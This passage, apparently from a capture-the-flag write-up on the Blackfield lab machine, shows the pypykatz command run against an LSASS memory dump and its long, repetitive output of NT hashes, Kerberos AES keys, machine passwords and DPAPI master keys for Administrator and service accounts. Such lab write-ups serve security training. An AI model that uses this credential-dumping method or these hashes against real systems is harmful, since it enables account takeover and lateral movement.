+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: ae7032a985fe7303c182f82d15df15b1ccf731c7f33947e3bd2f193d12d9d684
+    == WDIGEST [3e4]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 24410 (5f5a)
+session_id 1
+username UMFD-1
+domainname Font Driver Host
+logon_server 
+logon_time 2020-02-23T17:57:46.569111+00:00
+sid S-1-5-96-0-1
+luid 24410
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [5f5a]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [5f5a]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 406499 (633e3)
+session_id 2
+username svc_backup
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T18:00:03.423728+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-1413
+luid 406499
+    == MSV ==
+        Username: svc_backup
+        Domain: BLACKFIELD
+        LM: NA
+        NT: 9658d1d1dcd9250115e2205d9f48400d
+        SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
+        DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
+    == WDIGEST [633e3]==
+        username svc_backup
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: svc_backup
+        Domain: BLACKFIELD.LOCAL
+        AES128 Key: 9658d1d1dcd9250115e2205d9f48400d
+        AES256 Key: 20a3e879a3a0ca4f51db1e63514a27ac18eef553d8f30c29805c398c97599e91
+    == WDIGEST [633e3]==
+        username svc_backup
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == DPAPI [633e3]==
+        luid 406499
+        key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
+        masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf
+        sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991
+
+== LogonSession ==
+authentication_id 366665 (59849)
+session_id 2
+username DWM-2
+domainname Window Manager
+logon_server 
+logon_time 2020-02-23T17:59:38.293877+00:00
+sid S-1-5-90-0-2
+luid 366665
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [59849]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [59849]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 366649 (59839)
+session_id 2
+username DWM-2
+domainname Window Manager
+logon_server 
+logon_time 2020-02-23T17:59:38.293877+00:00
+sid S-1-5-90-0-2
+luid 366649
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [59839]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [59839]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 256940 (3ebac)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server 
+logon_time 2020-02-23T17:59:13.068835+00:00
+sid S-1-5-18
+luid 256940
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.LOCAL
+
+== LogonSession ==
+authentication_id 136764 (2163c)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server 
+logon_time 2020-02-23T17:58:27.052945+00:00
+sid S-1-5-18
+luid 136764
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.LOCAL
+
+== LogonSession ==
+authentication_id 134935 (20f17)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server 
+logon_time 2020-02-23T17:58:26.834285+00:00
+sid S-1-5-18
+luid 134935
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.LOCAL
+
+== LogonSession ==
+authentication_id 997 (3e5)
+session_id 0
+username LOCAL SERVICE
+domainname NT AUTHORITY
+logon_server 
+logon_time 2020-02-23T17:57:47.162285+00:00
+sid S-1-5-19
+luid 997
+    == Kerberos ==
+        Username: 
+        Domain: 
+
+== LogonSession ==
+authentication_id 24405 (5f55)
+session_id 0
+username UMFD-0
+domainname Font Driver Host
+logon_server 
+logon_time 2020-02-23T17:57:46.569111+00:00
+sid S-1-5-96-0-0
+luid 24405
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [5f55]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [5f55]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 24294 (5ee6)
+session_id 0
+username UMFD-0
+domainname Font Driver Host
+logon_server 
+logon_time 2020-02-23T17:57:46.554117+00:00
+sid S-1-5-96-0-0
+luid 24294
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [5ee6]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [5ee6]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 24282 (5eda)
+session_id 1
+username UMFD-1
+domainname Font Driver Host
+logon_server 
+logon_time 2020-02-23T17:57:46.554117+00:00
+sid S-1-5-96-0-1
+luid 24282
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [5eda]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [5eda]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 22028 (560c)
+session_id 0
+username 
+domainname 
+logon_server 
+logon_time 2020-02-23T17:57:44.959593+00:00
+sid None
+luid 22028
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+
+== LogonSession ==
+authentication_id 999 (3e7)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server 
+logon_time 2020-02-23T17:57:44.913221+00:00
+sid S-1-5-18
+luid 999
+    == WDIGEST [3e7]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: dc01$
+        Domain: BLACKFIELD.LOCAL
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: ae7032a985fe7303c182f82d15df15b1ccf731c7f33947e3bd2f193d12d9d684
+    == WDIGEST [3e7]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == DPAPI [3e7]==
+        luid 999
+        key_guid 0f7e926c-c502-4cad-90fa-32b78425b5a9
+        masterkey ebbb538876be341ae33e88640e4e1d16c16ad5363c15b0709d3a97e34980ad5085436181f66fa3a0ec122d461676475b24be001736f920cd21637fee13dfc616
+        sha1_masterkey ed834662c755c50ef7285d88a4015f9c5d6499cd
+    == DPAPI [3e7]==
+        luid 999
+        key_guid f611f8d0-9510-4a8a-94d7-5054cc85a654
+        masterkey 7c874d2a50ea2c4024bd5b24eef4515088cf3fe21f3b9cafd3c81af02fd5ca742015117e7f2675e781ce7775fcde2740ae7207526ce493bdc89d2ae3eb0e02e9
+        sha1_masterkey cf1c0b79da85f6c84b96fd7a0a5d7a5265594477
+    == DPAPI [3e7]==
+        luid 999
+        key_guid 31632c55-7a7c-4c51-9065-65469950e94e
+        masterkey 825063c43b0ea082e2d3ddf6006a8dcced269f2d34fe4367259a0907d29139b58822349e687c7ea0258633e5b109678e8e2337d76d4e38e390d8b980fb737edb
+        sha1_masterkey 6f3e0e7bf68f9a7df07549903888ea87f015bb01
+    == DPAPI [3e7]==
+        luid 999
+        key_guid 7e0da320-072c-4b4a-969f-62087d9f9870
+        masterkey 1fe8f550be4948f213e0591eef9d876364246ea108da6dd2af73ff455485a56101067fbc669e99ad9e858f75ae9bd7e8a6b2096407c4541e2b44e67e4e21d8f5
+        sha1_masterkey f50955e8b8a7c921fdf9bac7b9a2483a9ac3ceed</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield/Memory-Analysis]
+&boxur;&boxh;$ pypykatz lsa minidump lsass.DMP 
+INFO:pypykatz:Parsing file lsass.DMP
+FILE: ======== lsass.DMP =======
+== LogonSession ==
+authentication_id 406458 (633ba)
+session_id 2
+username svc_backup
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T18:00:03.423728+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-1413
+luid 406458
+    == MSV ==
+        Username: svc_backup
+        Domain: BLACKFIELD
+        LM: NA
+        NT: 9658d1d1dcd9250115e2205d9f48400d
+        SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
+        DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
+    == WDIGEST [633ba]==
+        username svc_backup
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: svc_backup
+        Domain: BLACKFIELD.LOCAL
+        AES128 Key: 9658d1d1dcd9250115e2205d9f48400d
+        AES256 Key: 20a3e879a3a0ca4f51db1e63514a27ac18eef553d8f30c29805c398c97599e91
+    == WDIGEST [633ba]==
+        username svc_backup
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 365835 (5950b)
+session_id 2
+username UMFD-2
+domainname Font Driver Host
+logon_server 
+logon_time 2020-02-23T17:59:38.218491+00:00
+sid S-1-5-96-0-2
+luid 365835
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [5950b]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [5950b]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 365493 (593b5)
+session_id 2
+username UMFD-2
+domainname Font Driver Host
+logon_server 
+logon_time 2020-02-23T17:59:38.200147+00:00
+sid S-1-5-96-0-2
+luid 365493
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [593b5]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [593b5]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 257142 (3ec76)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server 
+logon_time 2020-02-23T17:59:13.318909+00:00
+sid S-1-5-18
+luid 257142
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.LOCAL
+
+== LogonSession ==
+authentication_id 153705 (25869)
+session_id 1
+username Administrator
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T17:59:04.506080+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-500
+luid 153705
+    == MSV ==
+        Username: Administrator
+        Domain: BLACKFIELD
+        LM: NA
+        NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+        SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
+        DPAPI: 240339f898b6ac4ce3f34702e4a8955000000000
+    == WDIGEST [25869]==
+        username Administrator
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: Administrator
+        Domain: BLACKFIELD.LOCAL
+        AES128 Key: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+        AES256 Key: ec841e1e29ad7d6332a243b6b4ab445839829244408269850ab7c78a2cf45615
+    == WDIGEST [25869]==
+        username Administrator
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == DPAPI [25869]==
+        luid 153705
+        key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
+        masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5
+        sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9
+
+== LogonSession ==
+authentication_id 137110 (21796)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server 
+logon_time 2020-02-23T17:58:27.068590+00:00
+sid S-1-5-18
+luid 137110
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.LOCAL
+
+== LogonSession ==
+authentication_id 134695 (20e27)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server 
+logon_time 2020-02-23T17:58:26.678019+00:00
+sid S-1-5-18
+luid 134695
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.LOCAL
+
+== LogonSession ==
+authentication_id 40310 (9d76)
+session_id 1
+username DWM-1
+domainname Window Manager
+logon_server 
+logon_time 2020-02-23T17:57:46.897202+00:00
+sid S-1-5-90-0-1
+luid 40310
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [9d76]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [9d76]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 40232 (9d28)
+session_id 1
+username DWM-1
+domainname Window Manager
+logon_server 
+logon_time 2020-02-23T17:57:46.897202+00:00
+sid S-1-5-90-0-1
+luid 40232
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [9d28]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [9d28]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 996 (3e4)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server 
+logon_time 2020-02-23T17:57:46.725846+00:00
+sid S-1-5-20
+luid 996
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [3e4]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: dc01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: ae7032a985fe7303c182f82d15df15b1ccf731c7f33947e3bd2f193d12d9d684
+    == WDIGEST [3e4]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 24410 (5f5a)
+session_id 1
+username UMFD-1
+domainname Font Driver Host
+logon_server 
+logon_time 2020-02-23T17:57:46.569111+00:00
+sid S-1-5-96-0-1
+luid 24410
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [5f5a]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
